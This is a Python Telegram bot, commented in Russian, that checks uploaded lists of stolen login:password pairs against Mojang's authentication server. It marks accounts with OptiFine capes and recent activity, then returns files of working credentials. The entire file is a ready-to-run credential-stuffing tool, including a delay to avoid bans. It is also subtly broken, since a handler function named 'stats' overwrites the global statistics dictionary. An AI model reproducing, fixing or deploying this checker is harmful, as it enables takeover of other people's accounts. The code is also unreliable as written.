import os
import logging
import asyncio
import aiofiles
import requests
import json
import time
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.constants import ParseMode

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика как на скрине
stats = {
    'total_checked': 0,
    'valid_accounts': 0,
    'invalid_accounts': 0,
    'cape_found': 0,
    'start_time': datetime.now()
}

class AccountChecker:
    """Проверка аккаунтов"""
    
    @staticmethod
    async def check_account(login, password):
        """Проверяет один аккаунт"""
        session = requests.Session()
        
        try:
            login = login.strip()
            password = password.strip()
            
            # 1. Авторизация в Mojang
            auth_payload = {
                "agent": {
                    "name": "Minecraft",
                    "version": 1
                },
                "username": login,
                "password": password,
                "requestUser": True
            }
            
            auth_req = session.post(
                'https://authserver.mojang.com/authenticate',
                json=auth_payload,
                timeout=30
            )
            
            if auth_req.status_code != 200:
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': f'HTTP {auth_req.status_code}'
                }
            
            auth_data = auth_req.json()
            
            if 'error' in auth_data:
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': auth_data.get('errorMessage', 'Ошибка')
                }
            
            if 'selectedProfile' not in auth_data:
                return {
                    'login': login,
                    'status': 'migrated',
                    'error': 'Microsoft'
                }
            
            # Данные аккаунта
            uuid = auth_data['selectedProfile']['id']
            username = auth_data['selectedProfile']['name']
            
            # 2. Проверка плаща OptiFine
            cape_result = await AccountChecker.check_optifine_cape(username)
            
            # 3. Последний вход
            last_login = await AccountChecker.get_last_login(username)
            
            return {
                'login': login,
                'password': password,
                'username': username,
                'uuid': uuid,
                'status': 'valid',
                'has_cape': cape_result['has_cape'],
                'cape_name': cape_result.get('cape_name', 'OptiFine Cape'),
                'cape_url': cape_result.get('cape_url'),
                'last_login': last_login['last_seen'],
                'activity': last_login['activity']
            }
            
        except Exception as e:
            logger.error(f"Ошибка: {e}")
            return {
                'login': login,
                'status': 'error',
                'error': str(e)[:50]
            }
        finally:
            session.close()
    
    @staticmethod
    async def check_optifine_cape(username):
        """Проверка плаща на optifine.net"""
        try:
            # Прямая проверка картинки плаща
            cape_url = f"https://optifine.net/capes/{username}.png"
            
            response = requests.get(cape_url, timeout=5, stream=True)
            
            if response.status_code == 200:
                # Проверяем что это PNG и не пустой
                content_type = response.headers.get('content-type', '')
                content_length = int(response.headers.get('content-length', 0))
                
                if 'image' in content_type and content_length > 1000:
                    logger.info(f"✅ Есть плащ у {username}")
                    return {
                        'has_cape': True,
                        'cape_name': 'OptiFine Cape',
                        'cape_url': cape_url
                    }
            
            return {'has_cape': False}
            
        except Exception as e:
            logger.error(f"Ошибка проверки плаща: {e}")
            return {'has_cape': False}
    
    @staticmethod
    async def get_last_login(username):
        """Получаем дату последнего входа"""
        try:
            # Получаем UUID
            uuid_url = f"https://api.mojang.com/users/profiles/minecraft/{username}"
            uuid_resp = requests.get(uuid_url, timeout=5)
            
            if uuid_resp.status_code != 200:
                return {'last_seen': 'неизвестно', 'activity': 'неизвестно'}
            
            uuid_data = uuid_resp.json()
            uuid = uuid_data['id']
            
            # Запрос к NameMC
            namemc_url = f"https://api.namemc.com/profile/{uuid}"
            headers = {'User-Agent': 'Mozilla/5.0'}
            
            response = requests.get(namemc_url, headers=headers, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                
                if 'lastSeen' in data:
                    last_seen = data['lastSeen'] / 1000
                    last_date = datetime.fromtimestamp(last_seen)
                    days = (datetime.now() - last_date).days
                    
                    if days == 0:
                        return {'last_seen': 'сегодня', 'activity': '🔥 активен'}
                    elif days == 1:
                        return {'last_seen': 'вчера', 'activity': '✅ был'}
                    else:
                        return {'last_seen': f'{days} дней', 'activity': '💤 неактивен'}
            
            return {'last_seen': 'неизвестно', 'activity': 'неизвестно'}
            
        except Exception as e:
            return {'last_seen': 'ошибка', 'activity': 'ошибка'}

async def process_file(file_path, update, context):
    """Обрабатывает файл с аккаунтами"""
    results = {
        'valid': [],
        'with_cape': [],
        'invalid': [],
        'migrated': [],
        'error': []
    }
    
    # Сообщение как на скрине
    progress_msg = await update.message.reply_text(
        "🔄 Начинаю обработку...",
        parse_mode=ParseMode.MARKDOWN
    )
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        # Парсим аккаунты
        lines = content.strip().split('\n')
        accounts = []
        
        for line in lines:
            line = line.strip()
            if line and ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2 and parts[0] and parts[1]:
                    accounts.append((parts[0].strip(), parts[1].strip()))
        
        total = len(accounts)
        
        if total == 0:
            await progress_msg.edit_text("❌ Нет аккаунтов в файле")
            return
        
        # Обновляем статус
        await progress_msg.edit_text(
            f"📥 Файл получен: {update.message.document.file_name}\n"
            f"📦 Размер: {update.message.document.file_size / 1024:.1f} КБ\n\n"
            f"🔄 Начинаю обработку...",
            parse_mode=ParseMode.MARKDOWN
        )
        
        start_time = time.time()
        
        # Проверяем каждый аккаунт
        for i, (login, password) in enumerate(accounts, 1):
            # Обновляем прогресс
            if i % 5 == 0 or i == total:
                elapsed = time.time() - start_time
                remaining = (elapsed / i) * (total - i) if i > 0 else 0
                
                status_text = (
                    f"📊 Прогресс: {i}/{total}\n"
                    f"✅ Найдено плащей: {len(results['with_cape'])}\n"
                    f"⏱ Прошло: {int(elapsed)}с\n"
                    f"⏳ Осталось: ~{int(remaining)}с\n\n"
                    f"🔄 Проверяю: {login[:15]}..."
                )
                await progress_msg.edit_text(status_text, parse_mode=ParseMode.MARKDOWN)
            
            # Проверка
            result = await AccountChecker.check_account(login, password)
            
            # Сортируем результаты
            if result['status'] == 'valid':
                results['valid'].append(result)
                if result.get('has_cape'):
                    results['with_cape'].append(result)
                    stats['cape_found'] += 1
                stats['valid_accounts'] += 1
            elif result['status'] == 'migrated':
                results['migrated'].append(result)
                stats['invalid_accounts'] += 1
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                stats['invalid_accounts'] += 1
            else:
                results['error'].append(result)
                stats['invalid_accounts'] += 1
            
            stats['total_checked'] += 1
            await asyncio.sleep(0.5)  # Пауза чтоб не забанили
        
        # Сохраняем результаты
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # 1. Файл с плащами (самое главное)
        if results['with_cape']:
            cape_file = f"Плащи_{len(results['with_cape'])}_штук_{timestamp}.txt"
            async with aiofiles.open(cape_file, 'w', encoding='utf-8') as f:
                await f.write("🔥 АККАУНТЫ С ПЛАЩАМИ OPTIFINE 🔥\n")
                await f.write("="*50 + "\n\n")
                for acc in results['with_cape']:
                    await f.write(
                        f"Логин: {acc['login']}\n"
                        f"Пароль: {acc['password']}\n"
                        f"Ник: {acc['username']}\n"
                        f"Плащ: {acc['cape_name']}\n"
                        f"Последний вход: {acc['last_login']}\n"
                        f"Активность: {acc['activity']}\n"
                        f"UUID: {acc['uuid']}\n"
                        f"-"*30 + "\n\n"
                    )
            
            with open(cape_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=cape_file,
                    caption=f"🔥 Плащи {len(results['with_cape'])} штук.txt"
                )
            os.remove(cape_file)
        
        # 2. Все валидные
        if results['valid']:
            valid_file = f"valid_{len(results['valid'])}_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ Рабочие: {len(results['valid'])}"
                )
            os.remove(valid_file)
        
        # Итоговая статистика как на скрине
        elapsed_time = time.time() - start_time
        minutes = int(elapsed_time // 60)
        seconds = int(elapsed_time % 60)
        
        stats_text = (
            f"# Бот Каппер - Бармен\n"
            f"## {stats['total_checked']}\n\n"
            f"- Всего проверено: {total}\n"
            f"- Валидных: {len(results['valid'])}\n"
            f"- Невалидных: {len(results['invalid'])}\n"
            f"- С плащами: {len(results['with_cape'])}\n"
            f"- В Microsoft: {len(results['migrated'])}\n"
            f"- Ошибок: {len(results['error'])}\n\n"
            f"---\n\n"
            f"⏱ Время: {minutes}м {seconds}с\n"
        )
        
        await update.message.reply_text(stats_text, parse_mode=ParseMode.MARKDOWN)
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ Ошибка: {str(e)}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

# Команды
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    user_id = update.effective_user.id
    
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Нет доступа")
        return
    
    # Статистика как на скрине
    uptime = datetime.now() - stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    text = (
        f"# Бот Каппер - Бармен\n"
        f"## {stats['total_checked']}\n\n"
        f"- Всего проверено: {stats['total_checked']}\n"
        f"- Валидных: {stats['valid_accounts']}\n"
        f"- Невалидных: {stats['invalid_accounts']}\n"
        f"- С плащами: {stats['cape_found']}\n\n"
        f"---\n\n"
        f"### Работает: {hours}ч {minutes}мин\n"
        f"#### Запущен: {stats['start_time'].strftime('%d.%m.%Y %H:%M')}\n\n"
        f"📥 Отправь .txt файл с логин:пароль"
    )
    
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Статистика"""
    uptime = datetime.now() - stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    text = (
        f"📊 **Статистика**\n\n"
        f"Всего: {stats['total_checked']}\n"
        f"✅ Валидных: {stats['valid_accounts']}\n"
        f"❌ Невалидных: {stats['invalid_accounts']}\n"
        f"🔥 С плащами: {stats['cape_found']}\n\n"
        f"⏱ Работаю: {hours}ч {minutes}мин"
    )
    
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    user_id = update.effective_user.id
    
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Нет доступа")
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Нужен .txt файл")
        return
    
    if doc.file_size > 5 * 1024 * 1024:
        await update.message.reply_text("❌ Файл > 5 МБ")
        return
    
    try:
        # Сначала отправляем инфу о файле
        await update.message.reply_text(
            f"📥 Файл получен: {doc.file_name}\n"
            f"📦 Размер: {doc.file_size / 1024:.1f} КБ\n\n"
            f"🔄 Начинаю обработку...",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Скачиваем
        file = await context.bot.get_file(doc.file_id)
        file_path = f"temp_{user_id}_{doc.file_name}"
        await file.download_to_drive(file_path)
        
        # Обрабатываем
        await process_file(file_path, update, context)
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ Ошибка: {str(e)}")

def main():
    """Запуск"""
    if not TOKEN:
        print("❌ Нет токена!")
        return
    
    print("🚀 Запуск бота...")
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ Бот работает!")
    app.run_polling()

if __name__ == '__main__':
    main()